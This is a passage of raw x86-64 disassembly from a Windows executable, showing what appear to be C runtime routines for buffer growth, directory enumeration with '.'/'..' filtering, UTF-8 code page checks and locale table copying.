   140005e77:	44 8d 78 08          	lea    0x8(%rax),%r15d
   140005e7b:	4c 8b 77 10          	mov    0x10(%rdi),%r14
   140005e7f:	49 3b ce             	cmp    %r14,%rcx
   140005e82:	0f 85 9d 00 00 00    	jne    0x140005f25
   140005e88:	48 39 37             	cmp    %rsi,(%rdi)
   140005e8b:	75 2b                	jne    0x140005eb8
   140005e8d:	41 8b d7             	mov    %r15d,%edx
   140005e90:	8d 48 04             	lea    0x4(%rax),%ecx
   140005e93:	e8 48 f9 ff ff       	call   0x1400057e0
   140005e98:	33 c9                	xor    %ecx,%ecx
   140005e9a:	48 89 07             	mov    %rax,(%rdi)
   140005e9d:	e8 b6 f9 ff ff       	call   0x140005858
   140005ea2:	48 8b 0f             	mov    (%rdi),%rcx
   140005ea5:	48 85 c9             	test   %rcx,%rcx
   140005ea8:	74 42                	je     0x140005eec
   140005eaa:	48 8d 41 20          	lea    0x20(%rcx),%rax
   140005eae:	48 89 4f 08          	mov    %rcx,0x8(%rdi)
   140005eb2:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140005eb6:	eb 6d                	jmp    0x140005f25
   140005eb8:	4c 2b 37             	sub    (%rdi),%r14
   140005ebb:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140005ec2:	ff ff 7f 
   140005ec5:	49 c1 fe 03          	sar    $0x3,%r14
   140005ec9:	4c 3b f0             	cmp    %rax,%r14
   140005ecc:	77 1e                	ja     0x140005eec
   140005ece:	48 8b 0f             	mov    (%rdi),%rcx
   140005ed1:	4b 8d 2c 36          	lea    (%r14,%r14,1),%rbp
   140005ed5:	48 8b d5             	mov    %rbp,%rdx
   140005ed8:	4d 8b c7             	mov    %r15,%r8
   140005edb:	e8 e0 2c 00 00       	call   0x140008bc0
   140005ee0:	48 85 c0             	test   %rax,%rax
   140005ee3:	75 22                	jne    0x140005f07
   140005ee5:	33 c9                	xor    %ecx,%ecx
   140005ee7:	e8 6c f9 ff ff       	call   0x140005858
   140005eec:	48 8b cb             	mov    %rbx,%rcx
   140005eef:	e8 64 f9 ff ff       	call   0x140005858
   140005ef4:	be 0c 00 00 00       	mov    $0xc,%esi
   140005ef9:	33 c9                	xor    %ecx,%ecx
   140005efb:	e8 58 f9 ff ff       	call   0x140005858
   140005f00:	8b c6                	mov    %esi,%eax
   140005f02:	e9 02 ff ff ff       	jmp    0x140005e09
   140005f07:	4a 8d 0c f0          	lea    (%rax,%r14,8),%rcx
   140005f0b:	48 89 07             	mov    %rax,(%rdi)
   140005f0e:	48 89 4f 08          	mov    %rcx,0x8(%rdi)
   140005f12:	48 8d 0c e8          	lea    (%rax,%rbp,8),%rcx
   140005f16:	48 89 4f 10          	mov    %rcx,0x10(%rdi)
   140005f1a:	33 c9                	xor    %ecx,%ecx
   140005f1c:	e8 37 f9 ff ff       	call   0x140005858
   140005f21:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140005f25:	48 89 19             	mov    %rbx,(%rcx)
   140005f28:	4c 01 7f 08          	add    %r15,0x8(%rdi)
   140005f2c:	eb cb                	jmp    0x140005ef9
   140005f2e:	45 33 c9             	xor    %r9d,%r9d
   140005f31:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140005f36:	45 33 c0             	xor    %r8d,%r8d
   140005f39:	33 d2                	xor    %edx,%edx
   140005f3b:	33 c9                	xor    %ecx,%ecx
   140005f3d:	e8 7e f7 ff ff       	call   0x1400056c0
   140005f42:	cc                   	int3
   140005f43:	cc                   	int3
   140005f44:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140005f49:	55                   	push   %rbp
   140005f4a:	56                   	push   %rsi
   140005f4b:	57                   	push   %rdi
   140005f4c:	41 54                	push   %r12
   140005f4e:	41 55                	push   %r13
   140005f50:	41 56                	push   %r14
   140005f52:	41 57                	push   %r15
   140005f54:	48 8d ac 24 d0 fd ff 	lea    -0x230(%rsp),%rbp
   140005f5b:	ff 
   140005f5c:	48 81 ec 30 03 00 00 	sub    $0x330,%rsp
   140005f63:	48 8b 05 be 10 01 00 	mov    0x110be(%rip),%rax        # 0x140017028
   140005f6a:	48 33 c4             	xor    %rsp,%rax
   140005f6d:	48 89 85 20 02 00 00 	mov    %rax,0x220(%rbp)
   140005f74:	4d 8b e0             	mov    %r8,%r12
   140005f77:	48 8b f1             	mov    %rcx,%rsi
   140005f7a:	48 bb 01 08 00 00 00 	movabs $0x200000000801,%rbx
   140005f81:	20 00 00 
   140005f84:	48 3b d1             	cmp    %rcx,%rdx
   140005f87:	74 22                	je     0x140005fab
   140005f89:	8a 02                	mov    (%rdx),%al
   140005f8b:	2c 2f                	sub    $0x2f,%al
   140005f8d:	3c 2d                	cmp    $0x2d,%al
   140005f8f:	77 0a                	ja     0x140005f9b
   140005f91:	48 0f be c0          	movsbq %al,%rax
   140005f95:	48 0f a3 c3          	bt     %rax,%rbx
   140005f99:	72 10                	jb     0x140005fab
   140005f9b:	48 8b ce             	mov    %rsi,%rcx
   140005f9e:	e8 55 40 00 00       	call   0x140009ff8
   140005fa3:	48 8b d0             	mov    %rax,%rdx
   140005fa6:	48 3b c6             	cmp    %rsi,%rax
   140005fa9:	75 de                	jne    0x140005f89
   140005fab:	44 8a 02             	mov    (%rdx),%r8b
   140005fae:	41 80 f8 3a          	cmp    $0x3a,%r8b
   140005fb2:	75 1e                	jne    0x140005fd2
   140005fb4:	48 8d 46 01          	lea    0x1(%rsi),%rax
   140005fb8:	48 3b d0             	cmp    %rax,%rdx
   140005fbb:	74 15                	je     0x140005fd2
   140005fbd:	4d 8b cc             	mov    %r12,%r9
   140005fc0:	45 33 c0             	xor    %r8d,%r8d
   140005fc3:	33 d2                	xor    %edx,%edx
   140005fc5:	48 8b ce             	mov    %rsi,%rcx
   140005fc8:	e8 ef fd ff ff       	call   0x140005dbc
   140005fcd:	e9 56 02 00 00       	jmp    0x140006228
   140005fd2:	41 80 e8 2f          	sub    $0x2f,%r8b
   140005fd6:	33 ff                	xor    %edi,%edi
   140005fd8:	41 80 f8 2d          	cmp    $0x2d,%r8b
   140005fdc:	77 0c                	ja     0x140005fea
   140005fde:	49 0f be c0          	movsbq %r8b,%rax
   140005fe2:	48 0f a3 c3          	bt     %rax,%rbx
   140005fe6:	b0 01                	mov    $0x1,%al
   140005fe8:	72 03                	jb     0x140005fed
   140005fea:	40 8a c7             	mov    %dil,%al
   140005fed:	48 2b d6             	sub    %rsi,%rdx
   140005ff0:	48 89 7d a0          	mov    %rdi,-0x60(%rbp)
   140005ff4:	48 ff c2             	inc    %rdx
   140005ff7:	48 89 7d a8          	mov    %rdi,-0x58(%rbp)
   140005ffb:	f6 d8                	neg    %al
   140005ffd:	48 89 7d b0          	mov    %rdi,-0x50(%rbp)
   140006001:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140006006:	48 89 7d b8          	mov    %rdi,-0x48(%rbp)
   14000600a:	4d 1b ed             	sbb    %r13,%r13
   14000600d:	48 89 7d c0          	mov    %rdi,-0x40(%rbp)
   140006011:	4c 23 ea             	and    %rdx,%r13
   140006014:	40 88 7d c8          	mov    %dil,-0x38(%rbp)
   140006018:	33 d2                	xor    %edx,%edx
   14000601a:	e8 f5 ec ff ff       	call   0x140004d14
   14000601f:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140006024:	41 bf e9 fd 00 00    	mov    $0xfde9,%r15d
   14000602a:	44 39 78 0c          	cmp    %r15d,0xc(%rax)
   14000602e:	75 18                	jne    0x140006048
   140006030:	40 38 7c 24 48       	cmp    %dil,0x48(%rsp)
   140006035:	74 0c                	je     0x140006043
   140006037:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000603c:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140006043:	45 8b c7             	mov    %r15d,%r8d
   140006046:	eb 3a                	jmp    0x140006082
   140006048:	e8 27 27 00 00       	call   0x140008774
   14000604d:	85 c0                	test   %eax,%eax
   14000604f:	75 1b                	jne    0x14000606c
   140006051:	40 38 7c 24 48       	cmp    %dil,0x48(%rsp)
   140006056:	74 0c                	je     0x140006064
   140006058:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000605d:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140006064:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000606a:	eb 16                	jmp    0x140006082
   14000606c:	40 38 7c 24 48       	cmp    %dil,0x48(%rsp)
   140006071:	74 0c                	je     0x14000607f
   140006073:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140006078:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000607f:	44 8b c7             	mov    %edi,%r8d
   140006082:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   140006086:	48 8b ce             	mov    %rsi,%rcx
   140006089:	e8 1e f8 ff ff       	call   0x1400058ac
   14000608e:	48 8b 4d b0          	mov    -0x50(%rbp),%rcx
   140006092:	4c 8d 45 d0          	lea    -0x30(%rbp),%r8
   140006096:	85 c0                	test   %eax,%eax
   140006098:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   14000609c:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400060a1:	48 0f 45 cf          	cmovne %rdi,%rcx
   1400060a5:	45 33 c9             	xor    %r9d,%r9d
   1400060a8:	33 d2                	xor    %edx,%edx
   1400060aa:	ff 15 a8 80 00 00    	call   *0x80a8(%rip)        # 0x14000e158
   1400060b0:	48 8b d8             	mov    %rax,%rbx
   1400060b3:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400060b7:	75 17                	jne    0x1400060d0
   1400060b9:	4d 8b cc             	mov    %r12,%r9
   1400060bc:	45 33 c0             	xor    %r8d,%r8d
   1400060bf:	33 d2                	xor    %edx,%edx
   1400060c1:	48 8b ce             	mov    %rsi,%rcx
   1400060c4:	e8 f3 fc ff ff       	call   0x140005dbc
   1400060c9:	8b f8                	mov    %eax,%edi
   1400060cb:	e9 47 01 00 00       	jmp    0x140006217
   1400060d0:	4d 8b 74 24 08       	mov    0x8(%r12),%r14
   1400060d5:	4d 2b 34 24          	sub    (%r12),%r14
   1400060d9:	49 c1 fe 03          	sar    $0x3,%r14
   1400060dd:	33 d2                	xor    %edx,%edx
   1400060df:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   1400060e4:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400060e9:	48 89 7c 24 78       	mov    %rdi,0x78(%rsp)
   1400060ee:	48 89 7d 80          	mov    %rdi,-0x80(%rbp)
   1400060f2:	48 89 7d 88          	mov    %rdi,-0x78(%rbp)
   1400060f6:	48 89 7d 90          	mov    %rdi,-0x70(%rbp)
   1400060fa:	40 88 7d 98          	mov    %dil,-0x68(%rbp)
   1400060fe:	e8 11 ec ff ff       	call   0x140004d14
   140006103:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   140006108:	44 39 78 0c          	cmp    %r15d,0xc(%rax)
   14000610c:	75 18                	jne    0x140006126
   14000610e:	40 38 7c 24 68       	cmp    %dil,0x68(%rsp)
   140006113:	74 0c                	je     0x140006121
   140006115:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000611a:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140006121:	45 8b c7             	mov    %r15d,%r8d
   140006124:	eb 3a                	jmp    0x140006160
   140006126:	e8 49 26 00 00       	call   0x140008774
   14000612b:	85 c0                	test   %eax,%eax
   14000612d:	75 1b                	jne    0x14000614a
   14000612f:	40 38 7c 24 68       	cmp    %dil,0x68(%rsp)
   140006134:	74 0c                	je     0x140006142
   140006136:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000613b:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140006142:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140006148:	eb 16                	jmp    0x140006160
   14000614a:	40 38 7c 24 68       	cmp    %dil,0x68(%rsp)
   14000614f:	74 0c                	je     0x14000615d
   140006151:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140006156:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000615d:	44 8b c7             	mov    %edi,%r8d
   140006160:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140006165:	48 8d 4d fc          	lea    -0x4(%rbp),%rcx
   140006169:	e8 b6 f8 ff ff       	call   0x140005a24
   14000616e:	4c 8b 7d 80          	mov    -0x80(%rbp),%r15
   140006172:	85 c0                	test   %eax,%eax
   140006174:	49 8b cf             	mov    %r15,%rcx
   140006177:	48 0f 45 cf          	cmovne %rdi,%rcx
   14000617b:	80 39 2e             	cmpb   $0x2e,(%rcx)
   14000617e:	75 11                	jne    0x140006191
   140006180:	8a 41 01             	mov    0x1(%rcx),%al
   140006183:	84 c0                	test   %al,%al
   140006185:	74 20                	je     0x1400061a7
   140006187:	3c 2e                	cmp    $0x2e,%al
   140006189:	75 06                	jne    0x140006191
   14000618b:	40 38 79 02          	cmp    %dil,0x2(%rcx)
   14000618f:	74 16                	je     0x1400061a7
   140006191:	4d 8b cc             	mov    %r12,%r9
   140006194:	4d 8b c5             	mov    %r13,%r8
   140006197:	48 8b d6             	mov    %rsi,%rdx
   14000619a:	e8 1d fc ff ff       	call   0x140005dbc
   14000619f:	8b f8                	mov    %eax,%edi
   1400061a1:	85 c0                	test   %eax,%eax
   1400061a3:	75 5b                	jne    0x140006200
   1400061a5:	33 ff                	xor    %edi,%edi
   1400061a7:	40 38 7d 98          	cmp    %dil,-0x68(%rbp)
   1400061ab:	74 08                	je     0x1400061b5
   1400061ad:	49 8b cf             	mov    %r15,%rcx
   1400061b0:	e8 a3 f6 ff ff       	call   0x140005858
   1400061b5:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
   1400061b9:	48 8b cb             	mov    %rbx,%rcx
   1400061bc:	ff 15 9e 7f 00 00    	call   *0x7f9e(%rip)        # 0x14000e160
   1400061c2:	41 bf e9 fd 00 00    	mov    $0xfde9,%r15d
   1400061c8:	85 c0                	test   %eax,%eax
   1400061ca:	0f 85 0d ff ff ff    	jne    0x1400060dd
   1400061d0:	49 8b 04 24          	mov    (%r12),%rax
   1400061d4:	49 8b 54 24 08       	mov    0x8(%r12),%rdx
   1400061d9:	48 2b d0             	sub    %rax,%rdx
   1400061dc:	48 c1 fa 03          	sar    $0x3,%rdx
   1400061e0:	4c 3b f2             	cmp    %rdx,%r14
   1400061e3:	74 29                	je     0x14000620e
   1400061e5:	49 2b d6             	sub    %r14,%rdx
   1400061e8:	4a 8d 0c f0          	lea    (%rax,%r14,8),%rcx
   1400061ec:	4c 8d 0d a5 f6 ff ff 	lea    -0x95b(%rip),%r9        # 0x140005898
   1400061f3:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   1400061f9:	e8 12 35 00 00       	call   0x140009710
   1400061fe:	eb 0e                	jmp    0x14000620e
   140006200:	80 7d 98 00          	cmpb   $0x0,-0x68(%rbp)
   140006204:	74 08                	je     0x14000620e
   140006206:	49 8b cf             	mov    %r15,%rcx
   140006209:	e8 4a f6 ff ff       	call   0x140005858
   14000620e:	48 8b cb             	mov    %rbx,%rcx
   140006211:	ff 15 39 7f 00 00    	call   *0x7f39(%rip)        # 0x14000e150
   140006217:	80 7d c8 00          	cmpb   $0x0,-0x38(%rbp)
   14000621b:	74 09                	je     0x140006226
   14000621d:	48 8b 4d b0          	mov    -0x50(%rbp),%rcx
   140006221:	e8 32 f6 ff ff       	call   0x140005858
   140006226:	8b c7                	mov    %edi,%eax
   140006228:	48 8b 8d 20 02 00 00 	mov    0x220(%rbp),%rcx
   14000622f:	48 33 cc             	xor    %rsp,%rcx
   140006232:	e8 b9 71 00 00       	call   0x14000d3f0
   140006237:	48 8b 9c 24 88 03 00 	mov    0x388(%rsp),%rbx
   14000623e:	00 
   14000623f:	48 81 c4 30 03 00 00 	add    $0x330,%rsp
   140006246:	41 5f                	pop    %r15
   140006248:	41 5e                	pop    %r14
   14000624a:	41 5d                	pop    %r13
   14000624c:	41 5c                	pop    %r12
   14000624e:	5f                   	pop    %rdi
   14000624f:	5e                   	pop    %rsi
   140006250:	5d                   	pop    %rbp
   140006251:	c3                   	ret
   140006252:	cc                   	int3
   140006253:	cc                   	int3
   140006254:	e9 57 f9 ff ff       	jmp    0x140005bb0
   140006259:	cc                   	int3
   14000625a:	cc                   	int3
   14000625b:	cc                   	int3
   14000625c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006261:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140006266:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000626b:	57                   	push   %rdi
   14000626c:	48 83 ec 40          	sub    $0x40,%rsp
   140006270:	33 db                	xor    %ebx,%ebx
   140006272:	41 8b e8             	mov    %r8d,%ebp
   140006275:	48 8b fa             	mov    %rdx,%rdi
   140006278:	48 8b f1             	mov    %rcx,%rsi
   14000627b:	48 85 c9             	test   %rcx,%rcx
   14000627e:	75 19                	jne    0x140006299
   140006280:	38 5a 28             	cmp    %bl,0x28(%rdx)
   140006283:	74 03                	je     0x140006288
   140006285:	88 5a 28             	mov    %bl,0x28(%rdx)
   140006288:	48 89 5a 10          	mov    %rbx,0x10(%rdx)
   14000628c:	48 89 5a 18          	mov    %rbx,0x18(%rdx)
   140006290:	48 89 5a 20          	mov    %rbx,0x20(%rdx)
   140006294:	e9 bd 00 00 00       	jmp    0x140006356
   140006299:	66 39 19             	cmp    %bx,(%rcx)
   14000629c:	75 30                	jne    0x1400062ce
   14000629e:	48 39 5a 18          	cmp    %rbx,0x18(%rdx)
   1400062a2:	75 22                	jne    0x1400062c6
   1400062a4:	38 5a 28             	cmp    %bl,0x28(%rdx)
   1400062a7:	74 03                	je     0x1400062ac
   1400062a9:	88 5a 28             	mov    %bl,0x28(%rdx)
   1400062ac:	e8 0f f5 ff ff       	call   0x1400057c0
   1400062b1:	b9 22 00 00 00       	mov    $0x22,%ecx
   1400062b6:	89 08                	mov    %ecx,(%rax)
   1400062b8:	88 5f 28             	mov    %bl,0x28(%rdi)
   1400062bb:	48 89 5f 18          	mov    %rbx,0x18(%rdi)
   1400062bf:	8b d9                	mov    %ecx,%ebx
   1400062c1:	e9 90 00 00 00       	jmp    0x140006356
   1400062c6:	48 8b 42 10          	mov    0x10(%rdx),%rax
   1400062ca:	88 18                	mov    %bl,(%rax)
   1400062cc:	eb c2                	jmp    0x140006290
   1400062ce:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   1400062d3:	41 83 c9 ff          	or     $0xffffffff,%r9d
   1400062d7:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400062dc:	4c 8b c6             	mov    %rsi,%r8
   1400062df:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   1400062e3:	33 d2                	xor    %edx,%edx
   1400062e5:	8b cd                	mov    %ebp,%ecx
   1400062e7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400062ec:	e8 e7 0c 00 00       	call   0x140006fd8
   1400062f1:	48 63 d0             	movslq %eax,%rdx
   1400062f4:	85 c0                	test   %eax,%eax
   1400062f6:	75 16                	jne    0x14000630e
   1400062f8:	ff 15 92 7d 00 00    	call   *0x7d92(%rip)        # 0x14000e090
   1400062fe:	8b c8                	mov    %eax,%ecx
   140006300:	e8 4b f4 ff ff       	call   0x140005750
   140006305:	e8 b6 f4 ff ff       	call   0x1400057c0
   14000630a:	8b 18                	mov    (%rax),%ebx
   14000630c:	eb 48                	jmp    0x140006356
   14000630e:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   140006312:	48 3b d1             	cmp    %rcx,%rdx
   140006315:	76 0a                	jbe    0x140006321
   140006317:	38 5f 28             	cmp    %bl,0x28(%rdi)
   14000631a:	74 90                	je     0x1400062ac
   14000631c:	88 5f 28             	mov    %bl,0x28(%rdi)
   14000631f:	eb 8b                	jmp    0x1400062ac
   140006321:	48 8b 47 10          	mov    0x10(%rdi),%rax
   140006325:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140006329:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   14000632e:	4c 8b c6             	mov    %rsi,%r8
   140006331:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140006336:	33 d2                	xor    %edx,%edx
   140006338:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   14000633c:	8b cd                	mov    %ebp,%ecx
   14000633e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006343:	e8 90 0c 00 00       	call   0x140006fd8
   140006348:	48 63 c8             	movslq %eax,%rcx
   14000634b:	85 c0                	test   %eax,%eax
   14000634d:	74 a9                	je     0x1400062f8
   14000634f:	48 ff c9             	dec    %rcx
   140006352:	48 89 4f 20          	mov    %rcx,0x20(%rdi)
   140006356:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000635b:	8b c3                	mov    %ebx,%eax
   14000635d:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140006362:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140006367:	48 83 c4 40          	add    $0x40,%rsp
   14000636b:	5f                   	pop    %rdi
   14000636c:	c3                   	ret
   14000636d:	cc                   	int3
   14000636e:	cc                   	int3
   14000636f:	cc                   	int3
   140006370:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140006375:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000637a:	55                   	push   %rbp
   14000637b:	48 8d ac 24 70 fe ff 	lea    -0x190(%rsp),%rbp
   140006382:	ff 
   140006383:	48 81 ec 90 02 00 00 	sub    $0x290,%rsp
   14000638a:	48 8b 05 97 0c 01 00 	mov    0x10c97(%rip),%rax        # 0x140017028
   140006391:	48 33 c4             	xor    %rsp,%rax
   140006394:	48 89 85 80 01 00 00 	mov    %rax,0x180(%rbp)
   14000639b:	41 8b f8             	mov    %r8d,%edi
   14000639e:	48 8b da             	mov    %rdx,%rbx
   1400063a1:	41 b8 05 01 00 00    	mov    $0x105,%r8d
   1400063a7:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   1400063ac:	ff 15 56 7d 00 00    	call   *0x7d56(%rip)        # 0x14000e108
   1400063b2:	85 c0                	test   %eax,%eax
   1400063b4:	75 14                	jne    0x1400063ca
   1400063b6:	ff 15 d4 7c 00 00    	call   *0x7cd4(%rip)        # 0x14000e090
   1400063bc:	8b c8                	mov    %eax,%ecx
   1400063be:	e8 8d f3 ff ff       	call   0x140005750
   1400063c3:	33 c0                	xor    %eax,%eax
   1400063c5:	e9 a0 00 00 00       	jmp    0x14000646a
   1400063ca:	48 83 64 24 60 00    	andq   $0x0,0x60(%rsp)
   1400063d0:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400063d5:	48 8b c7             	mov    %rdi,%rax
   1400063d8:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400063dd:	33 d2                	xor    %edx,%edx
   1400063df:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400063e4:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   1400063e9:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   1400063ee:	c6 44 24 68 00       	movb   $0x0,0x68(%rsp)
   1400063f3:	e8 1c e9 ff ff       	call   0x140004d14
   1400063f8:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   1400063fd:	41 b8 e9 fd 00 00    	mov    $0xfde9,%r8d
   140006403:	44 39 40 0c          	cmp    %r8d,0xc(%rax)
   140006407:	75 15                	jne    0x14000641e
   140006409:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   14000640e:	74 47                	je     0x140006457
   140006410:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140006415:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000641c:	eb 39                	jmp    0x140006457
   14000641e:	e8 51 23 00 00       	call   0x140008774
   140006423:	85 c0                	test   %eax,%eax
   140006425:	75 1a                	jne    0x140006441
   140006427:	38 44 24 38          	cmp    %al,0x38(%rsp)
   14000642b:	74 0c                	je     0x140006439
   14000642d:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140006432:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140006439:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000643f:	eb 16                	jmp    0x140006457
   140006441:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   140006446:	74 0c                	je     0x140006454
   140006448:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000644d:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140006454:	45 33 c0             	xor    %r8d,%r8d
   140006457:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000645c:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140006461:	e8 f6 fd ff ff       	call   0x14000625c
   140006466:	8b 44 24 60          	mov    0x60(%rsp),%eax
   14000646a:	48 8b 8d 80 01 00 00 	mov    0x180(%rbp),%rcx
   140006471:	48 33 cc             	xor    %rsp,%rcx
   140006474:	e8 77 6f 00 00       	call   0x14000d3f0
   140006479:	4c 8d 9c 24 90 02 00 	lea    0x290(%rsp),%r11
   140006480:	00 
   140006481:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140006485:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   140006489:	49 8b e3             	mov    %r11,%rsp
   14000648c:	5d                   	pop    %rbp
   14000648d:	c3                   	ret
   14000648e:	cc                   	int3
   14000648f:	cc                   	int3
   140006490:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006495:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000649a:	57                   	push   %rdi
   14000649b:	48 83 ec 20          	sub    $0x20,%rsp
   14000649f:	49 8b f9             	mov    %r9,%rdi
   1400064a2:	49 8b d8             	mov    %r8,%rbx
   1400064a5:	8b 0a                	mov    (%rdx),%ecx
   1400064a7:	e8 38 11 00 00       	call   0x1400075e4
   1400064ac:	90                   	nop
   1400064ad:	48 8b 03             	mov    (%rbx),%rax
   1400064b0:	48 8b 08             	mov    (%rax),%rcx
   1400064b3:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   1400064ba:	48 83 c0 18          	add    $0x18,%rax
   1400064be:	48 8b 0d 23 19 01 00 	mov    0x11923(%rip),%rcx        # 0x140017de8
   1400064c5:	48 85 c9             	test   %rcx,%rcx
   1400064c8:	74 6f                	je     0x140006539
   1400064ca:	48 85 c0             	test   %rax,%rax
   1400064cd:	74 5d                	je     0x14000652c
   1400064cf:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400064d5:	45 8b c8             	mov    %r8d,%r9d
   1400064d8:	41 8d 50 7e          	lea    0x7e(%r8),%edx
   1400064dc:	0f 10 00             	movups (%rax),%xmm0
   1400064df:	0f 11 01             	movups %xmm0,(%rcx)
   1400064e2:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400064e6:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   1400064ea:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   1400064ee:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   1400064f2:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   1400064f6:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   1400064fa:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   1400064fe:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140006502:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   140006506:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   14000650a:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   14000650e:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   140006512:	48 03 ca             	add    %rdx,%rcx
   140006515:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   140006519:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   14000651d:	48 03 c2             	add    %rdx,%rax
   140006520:	49 83 e9 01          	sub    $0x1,%r9
   140006524:	75 b6                	jne    0x1400064dc
   140006526:	8a 00                	mov    (%rax),%al
   140006528:	88 01                	mov    %al,(%rcx)
   14000652a:	eb 27                	jmp    0x140006553
   14000652c:	33 d2                	xor    %edx,%edx
   14000652e:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   140006534:	e8 47 c4 ff ff       	call   0x140002980
   140006539:	e8 82 f2 ff ff       	call   0x1400057c0
   14000653e:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140006544:	e8 57 f1 ff ff       	call   0x1400056a0
   140006549:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000654f:	41 8d 50 7e          	lea    0x7e(%r8),%edx
   140006553:	48 8b 03             	mov    (%rbx),%rax
   140006556:	48 8b 08             	mov    (%rax),%rcx
   140006559:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140006560:	48 05 19 01 00 00    	add    $0x119,%rax
   140006566:	48 8b 0d 83 18 01 00 	mov    0x11883(%rip),%rcx        # 0x140017df0
   14000656d:	48 85 c9             	test   %rcx,%rcx
   140006570:	74 5e                	je     0x1400065d0
   140006572:	48 85 c0             	test   %rax,%rax
   140006575:	74 4c                	je     0x1400065c3
   140006577:	0f 10 00             	movups (%rax),%xmm0
   14000657a:	0f 11 01             	movups %xmm0,(%rcx)
   14000657d:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140006581:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140006585:	0f 10 40 20          	movups 0x20(%rax),%xmm0
